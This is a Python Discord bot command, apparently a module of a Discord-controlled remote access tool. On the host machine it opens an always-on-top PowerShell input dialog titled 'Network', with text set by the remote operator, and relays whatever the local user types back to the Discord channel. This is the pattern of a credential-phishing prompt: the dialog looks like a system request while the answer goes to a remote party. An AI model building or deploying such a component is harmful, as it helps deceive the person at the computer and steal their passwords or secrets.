import asyncio
import os
import subprocess

from discord.ext.commands import Context


async def inputbox_show(ctx: Context, prompt: str):
    # Pass user-provided text through environment variables
    # rather than inserting it directly into PowerShell code.
    env = os.environ.copy()
    env["FORM_PROMPT"] = prompt

    powershell_script = r"""
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$form = New-Object System.Windows.Forms.Form
$form.Text = 'Network'
$form.StartPosition = "CenterScreen"
$form.Size = New-Object System.Drawing.Size(420, 170)
$form.FormBorderStyle = "FixedDialog"
$form.MaximizeBox = $false
$form.MinimizeBox = $false
$form.TopMost = $true

$label = New-Object System.Windows.Forms.Label
$label.Text = $env:FORM_PROMPT
$label.Location = New-Object System.Drawing.Point(12, 12)
$label.Size = New-Object System.Drawing.Size(380, 25)
$form.Controls.Add($label)

$textBox = New-Object System.Windows.Forms.TextBox
$textBox.Location = New-Object System.Drawing.Point(12, 42)
$textBox.Size = New-Object System.Drawing.Size(380, 25)
$form.Controls.Add($textBox)

$okButton = New-Object System.Windows.Forms.Button
$okButton.Text = "Submit"
$okButton.Location = New-Object System.Drawing.Point(216, 82)
$okButton.DialogResult = [System.Windows.Forms.DialogResult]::OK
$form.Controls.Add($okButton)

$cancelButton = New-Object System.Windows.Forms.Button
$cancelButton.Text = "Cancel"
$cancelButton.Location = New-Object System.Drawing.Point(302, 82)
$cancelButton.DialogResult = [System.Windows.Forms.DialogResult]::Cancel
$form.Controls.Add($cancelButton)

$form.AcceptButton = $okButton
$form.CancelButton = $cancelButton
$form.Add_Shown({ $textBox.Focus() })

$result = $form.ShowDialog()

if ($result -eq [System.Windows.Forms.DialogResult]::OK) {
    [Console]::Write($textBox.Text)
    exit 0
} else {
    exit 2
}
"""

    def show_form():
        return subprocess.run(
            ["powershell.exe", "-NoProfile", "-STA", "-Command", powershell_script],
            capture_output=True,
            text=True,
            encoding="utf-8",
            errors="replace",
            env=env,
            timeout=300,
        )

    try:
        result = await asyncio.to_thread(show_form)

        if result.returncode == 2:
            await ctx.reply("Input cancelled.")
            return

        if result.returncode != 0:
            print(result.stderr)
            await ctx.reply("Failed to display the Windows form.")
            return

        entered_text = result.stdout

        # Send the entered value back to the Discord server.
        if not entered_text.strip():
            await ctx.reply("The input was empty.")
            return

        await ctx.reply(f"User said: {entered_text[:2000]}")

    except subprocess.TimeoutExpired:
        await ctx.reply("The input form timed out.")
    except Exception as exc:
        await ctx.reply(f"Error: {type(exc).__name__}: {exc}")
